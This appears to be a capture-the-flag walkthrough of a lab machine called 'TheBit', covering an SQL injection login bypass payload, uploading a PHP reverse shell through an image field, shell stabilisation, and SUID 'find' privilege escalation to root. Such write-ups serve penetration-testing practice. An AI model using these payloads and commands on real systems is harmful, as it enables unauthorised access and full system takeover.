<a href="https://0xvenus.github.io" style="display:inline-block; padding:8px 12px; background:#0078d4; color:#fff; text-decoration:none; border-radius:4px;">
    ⬅ Back to Homepage
</a>


## TheBit


```
ip = 10.150.150.146
os = linux
```

### nmap scan

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/ce9061be-19e7-4423-8924-6c118ab89604)

from the nmap scan we can see we have 5 open ports
so let's start enumeration from port 80 and going over to the webpage gives this 

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/eb70b552-aa70-4104-9525-1a620df23e2e)

i came across a login page on clicking the get started button.

so, trying default creds didn't work and since the server is running mysql let's give *SQLI* a trial
using the auth bypass payload  as username and password (tho the vulnerable part is the password field so u can enter anything as username while use the payload as passwd)
```
' or ''='
``` 
gave me admin access

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/066a1ffe-7c68-4b05-816c-ab5316bf2945)

Then we found the FLAG3 in the dashboard

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/d622e194-3951-4aa1-bdf2-61a637a2e6c8)

so, let's try to upload a reverse shell 

so, go to the test bank page and click on add question then upload a php reverse shell in the image field and save.

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/f2642b8d-3fef-487e-b980-bda8ad191586)

We've set our netcat listener to listen for reverse connection then click on *test bank*  again that should spawn you a shell.
Stabilizing the shell using ``` python -c "import pty;pty.spawn('/bin/bash')" ``` hit enter then ```export TERM=xterm``` And ```ctrl+z``` then  ```stty raw -echo;fg``` 

BOOM!
	
 we are in
	
 so let's check for the user flag
 
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/1ed5bd80-7408-4c06-a398-f087aa4cbd4a)


### privilege escalation

Enumerating the binaries having suid permission using the command
```
find / -perm -u=s -type f 2>/dev/null
```
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/6682414c-a029-41ed-93b6-991d0c7eb52f)

As we can see the *find* binary has suid permission set on it.
so, let's take the advantage for escalating our privilege to root
To do so, let's use the find command on **gtfobins**
```
find . -exec /bin/sh -p \; -quit
```
And we are root
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/d100b105-f598-41f1-8a60-a98e29887ac8)


Thanks.

